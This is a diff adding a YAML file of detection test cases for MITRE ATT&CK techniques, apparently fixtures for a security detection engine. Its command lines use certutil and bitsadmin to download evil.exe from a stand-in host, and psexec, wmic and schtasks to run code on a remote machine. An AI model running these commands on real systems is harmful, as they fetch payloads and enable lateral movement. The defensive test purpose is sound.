@@ -1,0 +1,60 @@
+technique: T1105
+name: Ingress Tool Transfer
+cases:
+  - name: certutil urlcache 下载
+    source: atomic T1105
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: certutil.exe
+        file:
+          path: "C:\\Windows\\System32\\certutil.exe"
+        cmd_line: "certutil.exe -urlcache -split -f http://10.0.0.1/evil.exe C:\\Windows\\Temp\\evil.exe"
+
+  - name: bitsadmin 传输
+    source: atomic T1197
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: bitsadmin.exe
+        file:
+          path: "C:\\Windows\\System32\\bitsadmin.exe"
+        cmd_line: "bitsadmin /transfer atomic /download http://10.0.0.1/evil.exe C:\\Temp\\evil.exe"
+
+  - name: psexec 远程执行
+    technique: T1021.002
+    source: atomic T1021.002
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: psexec.exe
+        file:
+          path: "C:\\Tools\\PsExec.exe"
+        cmd_line: "psexec.exe \\\\10.0.0.8 -u admin -p Pass123 cmd.exe /c whoami"
+
+  - name: wmic 远程创建进程
+    technique: T1047
+    source: atomic T1047
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: wmic.exe
+        file:
+          path: "C:\\Windows\\System32\\wbem\\WMIC.exe"
+        cmd_line: "wmic /node:10.0.0.8 process call create \"cmd.exe /c evil.exe\""
+
+  - name: schtasks 远程建计划任务
+    technique: T1053.005
+    source: atomic T1053.005
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: schtasks.exe
+        file:
+          path: "C:\\Windows\\System32\\schtasks.exe"
+        cmd_line: "schtasks /create /s 10.0.0.8 /tn atomic /tr C:\\evil.exe /sc onstart"
